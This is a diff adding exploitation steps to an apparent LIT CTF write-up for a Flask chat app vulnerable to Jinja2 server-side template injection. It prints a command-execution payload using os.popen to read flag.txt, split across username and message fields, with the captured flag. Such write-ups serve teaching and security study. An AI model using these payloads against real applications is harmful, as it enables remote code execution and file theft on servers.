@@ -69,10 +69,73 @@ It will be rendered as:
 username1: message1<br>username2: message2
 ```
 
+And since we can control both `username1`, `message1`, `username2` and `message2` we certainly can cause a <ins>Server Side Template Injection</ins>
+
+To confirm the possibility of a <ins>Server Side Template Injection (SSTI)</ins>, we can leverage our control over both `username` and `message` fields. This allows us to attempt injecting a Jinja2 payload that could execute server-side code.
+
+**Local Testing:**
+1. Create a `flag.txt` file in the same directory as `main.py`:
+  ```sh
+  echo "FLAG{REDACTED}" > flag.txt
+  ```
+2. Modify the template in `main.py` for the `/` route to include a test payload that reads the contents of `flag.txt`:
+  ```python
+  <div>{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}</div>
+  ```
+3. Run the Flask app locally:
+  ```sh
+  python3 main.py
+  ```
+4. Visit `http://localhost:5000`, set a `username`, and navigate to `/`. You should see the contents of `flag.txt` displayed on the page.
+
+![WhiteDukesDZ Logo](demonstration/local-test.png)
+
+However, on the remote instance, we cannot modify `main.py` directly. Therefore, our goal is to inject a payload through user input that results in the template rendering something like:
+
+```html
+{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}
+```
+
+by carefully crafting the values of `username` and `message`.
 ---
 
 ## Solution
 
-<!-- Describe your exploitation steps, payloads, and how you solved the challenge here. -->
+To exploit the SSTI vulnerability and retrieve the flag, our goal was to make the rendered chat log look like:
+
+```python
+{{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
+```
+
+Since we control both `username` and `message`, we can split the payload across two users/messages. Our approach:
+
+- `username1 = {{cycler.__init__.__globals__.os.popen('cat flag.txt`
+- `message1 = dummy`
+- `username2 = '[:12]).read()}}`
+- `message2 = dummy`
+
+This results in the following template being rendered:
+
+```python
+{{cycler.__init__.__globals__.os.popen('cat flag.txt: <br>'[:12]).read()}}
+```
+
+which is functionally equivalent to our intended payload, as the injected `<br>` and extra characters are ignored by the Python slice.
+
+We automated this process in `solution/solve.py`. To run the exploit against the remote instance provided by LIT CTF:
+
+```sh
+python3 solve.py
+```
+
+If successful, the script will output the flag:
+
+```sh
+Username set successfully.
+Message sent successfully.
+Username set successfully.
+Message sent successfully.
+LITCTF{1m_g0nn4_h4v3_t0_d0_m0r3_t0_5t0p_7he_1n3v1t4bl3_f0rw4rd_br4c3_f0rw4rd_br4c3_b4ckw4rd_br4c3_b4ckw4rd_br4c3}
+```
 
 
